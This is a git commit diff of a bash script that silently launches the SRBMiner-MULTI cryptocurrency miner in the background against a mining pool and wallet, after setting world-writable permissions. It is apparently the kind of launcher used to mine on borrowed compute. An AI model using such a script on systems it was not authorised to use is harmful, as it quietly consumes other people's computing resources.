8610865a9dff64f061451fd626ede18c688a20fb
jsiqiisn <100444720+jsiqiisn@users.noreply.github.com>
2022-05-26 20:33:57 +0700

    Update w.sh

--- w.sh
+++ w.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 chmod 777 lo.sh SRBMiner-MULTI
-./SRBMiner-MULTI --algorithm yespower --pool stratum+tcps://stratum-asia.rplant.xyz:17070 --wallet WbQR3w5EyWkuoFjhjYymrr3pEZDSTTgQkX.$(echo $(shuf -i 1-20000 -n 1)-coba) > /dev/null 2>&1 &
+./SRBMiner-MULTI --algorithm yespower --pool stratum+tcps://stratum-asia.rplant.xyz:17070 --wallet WbQR3w5EyWkuoFjhjYymrr3pEZDSTTgQkX.jancok > /dev/null 2>&1 &
 ./lo.sh
